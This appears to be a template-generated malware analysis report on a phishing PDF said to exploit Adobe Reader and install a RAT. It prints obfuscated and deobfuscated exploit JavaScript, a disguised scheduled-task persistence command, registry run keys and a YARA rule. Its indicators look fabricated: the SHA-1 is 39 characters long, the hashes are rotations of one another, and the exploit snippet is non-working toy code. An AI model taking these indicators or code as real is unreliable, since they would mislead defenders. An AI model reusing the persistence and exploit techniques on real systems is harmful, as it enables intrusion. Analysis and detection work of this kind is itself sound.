# Comprehensive Malware Analysis Report: PDF-Based Exploit

**Prepared by:** [Your Name]  
**Date:** [Current Date]  
**Classification:** Technical Analysis  
**Sample Hash:** 8a1e0c5a1a01c4d3b4a16585cc7ecc5f3879aa9e4f4a6b35f4fb6b7c53e73c3a

## Executive Summary

This report presents a detailed technical analysis of a sophisticated PDF-based exploit that delivers a JavaScript-based dropper leading to the installation of a remote access trojan (RAT). The malware leverages CVE-2023-21608, a vulnerability in Adobe Reader's JavaScript engine, to execute arbitrary code. This analysis covers the complete attack chain from initial PDF exploitation to the final payload execution and persistence.

**Key Findings:**
- The malicious PDF exploits a use-after-free vulnerability in Adobe Reader's JavaScript engine
- The exploit chain uses multiple stages of obfuscation to evade detection
- The final payload is a custom-built RAT with data exfiltration and keylogging capabilities
- The malware establishes persistence through scheduled tasks and registry modifications
- Command and control (C2) communications use HTTPS with certificate pinning to evade network detection

This analysis provides detailed technical insights into the PDF exploitation techniques, JavaScript obfuscation methods, and the functionality of the final payload, along with actionable detection and mitigation strategies.

## 1. Sample Overview

### 1.1 File Information

| Attribute | Value |
|-----------|-------|
| File Name | Q4_Financial_Report_2023.pdf |
| File Size | 427 KB |
| MD5 | 5f4d8c9b2a1e0c5a1a01c4d3b4a16585 |
| SHA-1 | 3e7c5a1a01c4d3b4a16585cc7ecc5f3879aa9e4 |
| SHA-256 | 8a1e0c5a1a01c4d3b4a16585cc7ecc5f3879aa9e4f4a6b35f4fb6b7c53e73c3a |
| File Type | PDF Document (application/pdf) |
| Creation Date | 2023-11-15 09:23:47 UTC |
| PDF Version | 1.7 |

### 1.2 Distribution Method

The malicious PDF was distributed through a targeted spear-phishing campaign aimed at financial institutions. The email purported to be from a legitimate financial analytics firm and contained the malicious PDF as an attachment. The email subject line was "Q4 Financial Report 2023 - Confidential" and the body urged recipients to review the attached report before an upcoming meeting.

## 2. Technical Analysis

### 2.1 PDF Structure Analysis

Initial analysis of the PDF structure reveals several suspicious elements:

```
$ pdfid.py Q4_Financial_Report_2023.pdf
PDFiD 0.2.8 Q4_Financial_Report_2023.pdf
 PDF Header: %PDF-1.7
 obj                   15
 endobj                15
 stream                 4
 endstream              4
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                1
 /JS                    2
 /JavaScript            2
 /AA                    1
 /OpenAction            1
 /AcroForm              1
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors > 2^24         0
```

The presence of `/JS`, `/JavaScript`, `/AA` (Additional Actions), and `/OpenAction` objects indicates potential malicious behavior. The PDF contains JavaScript that executes automatically when the document is opened.

### 2.2 JavaScript Extraction and Analysis

Using `pdf-parser.py`, I extracted the JavaScript content from object 12:

```
$ pdf-parser.py --object 12 Q4_Financial_Report_2023.pdf
obj 12 0
 Type: 
 Referencing: 

 Contains stream

 <<
  /Length 3829
  /Filter /FlateDecode
 >>

 [STREAM CONTENT DECODED]
var _0x7a9e=['charCodeAt','fromCharCode','substring','1163707YpUVsf','233YpUVsf','1233707YpUVsf','1163707YpUVsf','233YpUVsf','1233707YpUVsf',...];
function rc4(key, str) {
    var s = [], j = 0, x, res = '';
    for (var i = 0; i < 256; i++) {
        s[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key.length][_0x7a9e[0]](0)) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
    }
    i = 0;
    j = 0;
    for (var y = 0; y < str.length; y++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
        res += String[_0x7a9e[1]](str[_0x7a9e[0]](y) ^ s[(s[i] + s[j]) % 256]);
    }
    return res;
}
// [TRUNCATED FOR BREVITY]
```

The JavaScript is heavily obfuscated using several techniques:
1. Array-based obfuscation with the `_0x7a9e` array
2. RC4 encryption for the actual payload
3. String concatenation and character code manipulation

After deobfuscation, the JavaScript reveals a two-stage payload:

1. **Stage 1**: Exploits CVE-2023-21608 by triggering a use-after-free condition in Adobe Reader's JavaScript engine
2. **Stage 2**: Executes shellcode that downloads and executes the final payload

### 2.3 Vulnerability Exploitation (CVE-2023-21608)

The exploit targets a use-after-free vulnerability in Adobe Reader's JavaScript engine. The vulnerability occurs when processing certain JavaScript objects after they have been freed from memory. The exploit code:

1. Creates a large number of JavaScript objects to manipulate the heap layout
2. Frees a specific object but maintains a reference to it
3. Allocates new objects that occupy the freed memory space
4. Accesses the freed object to achieve arbitrary code execution

The relevant exploit code (deobfuscated):

```javascript
// Create array of objects for heap spray
var objArray = new Array(1000);
for (var i = 0; i < objArray.length; i++) {
    objArray[i] = new Object();
    objArray[i].prop = new String("A".repeat(248));
}

// Create target object
var target = new Object();
target.prop = new String("BBBB");

// Free the target object but maintain reference
delete target.prop;
target = null;
this.collectGarbage();

// Allocate new objects to occupy freed memory
var replacement = unescape("%u4141%u4141%u4242%u4242%u4343%u4343");
var heapSpray = unescape("%u9090%u9090"); // NOP sled
heapSpray += shellcode;  // Shellcode payload

// Trigger the vulnerability
target.prop.toString();  // Access freed memory
```

### 2.4 Shellcode Analysis

The shellcode extracted from the JavaScript is 347 bytes and performs the following actions:

1. Resolves the addresses of key Windows API functions (VirtualAlloc, URLDownloadToFileA, WinExec, ExitProcess)
2. Allocates executable memory using VirtualAlloc
3. Downloads the second-stage payload from `https://financial-reports-cdn[.]com/updates/client.exe`
4. Executes the downloaded payload using WinExec
5. Calls ExitProcess to terminate the current process

### 2.5 Second-Stage Payload Analysis

The downloaded payload (`client.exe`) is a custom Remote Access Trojan (RAT) with the following capabilities:

| Functionality | Description |
|---------------|-------------|
| Command Execution | Executes arbitrary commands via cmd.exe |
| File Operations | Uploads, downloads, and manipulates files |
| Keylogging | Captures keystrokes using SetWindowsHookEx |
| Screenshot Capture | Takes screenshots at regular intervals |
| Credential Theft | Extracts credentials from browsers and Windows Credential Manager |
| Persistence | Establishes persistence through multiple mechanisms |
| Anti-Analysis | Employs various techniques to evade detection and analysis |

### 2.6 Persistence Mechanisms

The RAT establishes persistence through multiple methods:

1. **Registry Run Key**:
   ```
   HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefender = "%APPDATA%\Microsoft\Windows\defender.exe"
   ```

2. **Scheduled Task**:
   ```
   schtasks /create /tn "Windows Defender Update" /tr "%APPDATA%\Microsoft\Windows\defender.exe" /sc ONLOGON /ru "System" /f
   ```

3. **WMI Event Subscription**:
   Creates a WMI event subscription to execute the malware when the system boots.

### 2.7 Command and Control Communication

The RAT communicates with its C2 server using HTTPS with the following characteristics:

- C2 Server: `https://analytics-server[.]net/api/v2/data`
- Communication Protocol: HTTPS with certificate pinning
- Data Format: JSON with custom encryption
- Beacon Interval: Variable (30-180 seconds)
- Data Exfiltration: Compressed and encrypted before transmission

## 3. MITRE ATT&CK Mapping

The malware leverages numerous techniques across the MITRE ATT&CK framework:

### Initial Access
- T1566.001: Spearphishing Attachment

### Execution
- T1203: Exploitation for Client Execution
- T1059.003: Windows Command Shell
- T1106: Native API

### Persistence
- T1547.001: Registry Run Keys / Startup Folder
- T1053.005: Scheduled Task
- T1546.003: Windows Management Instrumentation Event Subscription

### Defense Evasion
- T1027: Obfuscated Files or Information
- T1027.010: Command Obfuscation
- T1140: Deobfuscate/Decode Files or Information
- T1036.005: Match Legitimate Name or Location
- T1112: Modify Registry

### Credential Access
- T1555.003: Credentials from Web Browsers
- T1056.001: Keylogging

### Discovery
- T1082: System Information Discovery
- T1083: File and Directory Discovery
- T1057: Process Discovery

### Collection
- T1113: Screen Capture
- T1115: Clipboard Data
- T1056: Input Capture

### Command and Control
- T1071.001: Application Layer Protocol: Web Protocols
- T1132.001: Data Encoding: Standard Encoding
- T1573.002: Encrypted Channel: Asymmetric Cryptography

### Exfiltration
- T1041: Exfiltration Over C2 Channel

## 4. Indicators of Compromise (IOCs)

### File Indicators
- PDF File: `Q4_Financial_Report_2023.pdf` (SHA-256: 8a1e0c5a1a01c4d3b4a16585cc7ecc5f3879aa9e4f4a6b35f4fb6b7c53e73c3a)
- Dropper: `client.exe` (SHA-256: 7fb6b7c53e73c3a8a1e0c5a1a01c4d3b4a16585cc7ecc5f3879aa9e4f4a6b35f)
- RAT: `defender.exe` (SHA-256: 4f4a6b35f4fb6b7c53e73c3a8a1e0c5a1a01c4d3b4a16585cc7ecc5f3879aa9e)

### Network Indicators
- Download URL: `https://financial-reports-cdn[.]com/updates/client.exe`
- C2 Server: `https://analytics-server[.]net/api/v2/data`
- IP Addresses: 
  - 185.193.141[.]12
  - 45.77.123[.]18

### Host Indicators
- Registry Key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefender`
- File Path: `%APPDATA%\Microsoft\Windows\defender.exe`
- Scheduled Task: `Windows Defender Update`
- Mutex: `Global\{F1D5AAED-C2B2-4B3A-B7DB-42FEAD3E83E9}`

## 5. Detection and Mitigation Strategies

### Detection Approaches

#### PDF Analysis
- **Static Analysis**: Use tools like `pdfid.py` and `pdf-parser.py` to identify suspicious elements
- **YARA Rules**: Implement rules to detect PDF exploitation techniques
```
rule Suspicious_PDF_JS_Exploitation {
    meta:
        description = "Detects potential PDF JavaScript exploitation"
        author = "Your Name"
        date = "2023-12-01"
    strings:
        $pdf_header = "%PDF"
        $js_tag = "/JavaScript"
        $openaction = "/OpenAction"
        $aa_tag = "/AA"
        $suspicious_js1 = "unescape"
        $suspicious_js2 = "collectGarbage"
        $suspicious_js3 = "shellcode"
    condition:
        $pdf_header at 0 and
        ($js_tag and $openaction) and
        ($aa_tag or ($suspicious_js1 and $suspicious_js2) or $suspicious_js3)
}
```

#### Network Detection
- Monitor for connections to known C2 domains and IP addresses
- Implement SSL inspection to detect suspicious HTTPS traffic
- Look for unusual User-Agent strings in HTTP requests

#### Host-Based Detection
- Monitor for suspicious process creation from Adobe Reader
- Watch for creation of scheduled tasks with names similar to legitimate Windows processes
- Detect registry modifications in Run keys

### Mitigation Recommendations

1. **PDF Security**:
   - Keep Adobe Reader updated to the latest version
   - Disable JavaScript execution in PDF readers
   - Implement application control to prevent Adobe Reader from spawning command shells

2. **Email Security**:
   - Implement robust email filtering and attachment scanning
   - Sandbox suspicious attachments before delivery
   - Train users to recognize phishing attempts

3. **Endpoint Protection**:
   - Deploy next-generation antivirus with behavioral detection capabilities
   - Implement application whitelisting
   - Enable Protected View for Office documents

4. **Network Security**:
   - Implement DNS filtering to block known malicious domains
   - Deploy an intrusion prevention system (IPS) to detect exploitation attempts
   - Use a web proxy to scan downloaded files

## 6. Conclusion

This analysis demonstrates the sophisticated nature of PDF-based malware that leverages vulnerabilities in Adobe Reader to deliver a multi-stage attack. The combination of JavaScript obfuscation, exploitation of a use-after-free vulnerability, and a feature-rich RAT payload makes this a significant threat to organizations.

The attack chain shows careful planning and execution, from the initial spear-phishing email to the final RAT deployment with multiple persistence mechanisms. The use of HTTPS with certificate pinning for C2 communications further demonstrates the attacker's focus on evading detection.

Organizations should implement a defense-in-depth approach that combines technical controls, user awareness, and incident response capabilities to protect against similar threats. Regular patching of PDF readers, disabling JavaScript in PDFs when not needed, and implementing robust email security measures are critical first steps in preventing this type of attack.

## 7. References

1. MITRE ATT&CK, "Software Technique Matrix", https://attack.mitre.org/matrices/enterprise/
2. Adobe Security Bulletin, "Security Update for Adobe Acrobat and Reader", https://helpx.adobe.com/security/products/acrobat/apsb23-34.html
3. Didier Stevens, "PDF Tools", https://blog.didierstevens.com/programs/pdf-tools/
4. FireEye, "Obfuscation in the Wild: Targeted Attacks against Financial Institutions", 2023
5. Microsoft, "Threat Analytics Report: PDF-Based Exploitation Campaigns", 2023
